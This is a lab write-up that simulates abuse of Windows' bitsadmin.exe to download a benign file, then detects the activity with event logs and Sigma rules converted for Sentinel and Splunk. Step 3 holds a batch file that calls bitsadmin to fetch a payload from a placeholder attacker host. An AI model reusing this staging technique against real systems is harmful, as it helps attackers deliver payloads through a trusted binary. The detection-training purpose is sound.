# ⚙️ LOLBAS Lab: bitsadmin.exe Payload Simulation & Detection

## 🖥️ Lab Setup
- **Victim Machine**: Windows 10 Pro (VM)  
- **Attacker Host**: Windows 10 Pro (Host)  

**Tools Used**:
- `bitsadmin.exe` (Windows built-in binary)  
- `calc.exe` (benign process for visibility)  
- `hello.txt` (benign payload)  
- `simulate_initial_access.bat` (batch file)  
- Sigma CLI  

---

## 🔹 Step 1: Create a Benign Payload (Attacker Host)

```powershell
echo "Hello, LOLBAS Test" > C:\inetpub\wwwroot\hello.txt

````
## 🔹 Step 2: Host the File

Start the web server:
```powershell
Start-Service W3SVC
```
Verify in browser:
http://<attacker-ip>/hello.txt

## 🔹 Step 3: Create Malicious Batch File

On the victim VM, create a file simulate_initial_access.bat:

@echo off
start calc.exe
bitsadmin /transfer myDownloadJob /download /priority normal http://<attacker-ip>/hello.txt %USERPROFILE%\Downloads\hello.txt


📌 This script:

Opens Calculator (benign distraction).

Uses bitsadmin.exe to download hello.txt into Downloads.

## 🔹 Step 4: Execute the Batch File

Run on the victim VM:

simulate_initial_access.bat


✅ Calculator opens
✅ hello.txt is downloaded into C:\Users\<user>\Downloads\

## 🔹 Step 5: Verify the File Download
```powershell
cd %USERPROFILE%\Downloads
dir hello.txt
```

## 🔹 Step 6: Collect Detection Logs

Use PowerShell to extract process creation events (4688):
```powershell

Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 4688 } | Format-List TimeCreated, Message
```
Key Logs Observed:
cmd.exe launched

bitsadmin.exe executed with /transfer

powershell.exe (in related tests)

## 🔹 Step 7: Write Sigma Rules

Three Sigma detection rules were created:

win_bitsadmin_download.yml

win_powershell_iwr_from_cmd.yml

win_powershell_network_download.yml

Example: win_bitsadmin_download.yml

## 🔹 Step 8: Validate Sigma Rules

Install sigmatools:

pip install sigmatools


Validate a Sigma rule:

sigmac -t windows-audit win_bitsadmin_download.yml

## 🔹 Step 9: Convert Rules to JSON (Azure Sentinel)

Generate deployable Sentinel rules:

```powershell
sigmac -t sentinel-rule win_bitsadmin_download.yml > win_bitsadmin_download.json
sigmac -t sentinel-rule win_powershell_iwr_from_cmd.yml > win_powershell_iwr_from_cmd.json
sigmac -t sentinel-rule win_powershell_network_download.yml > win_powershell_network_download.json
```
## 🔹 Step 10: (Optional) Convert for Splunk / Sysmon

For Splunk:
```powershell
sigmac -t splunk win_bitsadmin_download.yml
```

For Sysmon:
```powershell
sigmac -t sysmon win_powershell_network_download.yml
```

## 📊 Results

Attack Simulated: .bat file abused bitsadmin.exe to download a benign payload.

Detection Evidence: Windows Event ID 4688 logs (process creation).

Sigma Rules: Created for bitsadmin.exe and PowerShell download activity.

Converted Outputs: JSON rules for Sentinel, SPL queries for Splunk, Sysmon-compatible rules.

## ✅ Conclusion

This lab demonstrates:

How LOLBAS binaries (like bitsadmin.exe) can be abused to stage payloads.

How to detect this activity via Windows Security logs.

How to use Sigma rules and convert them for SIEMs (Azure Sentinel, Splunk, Sysmon).
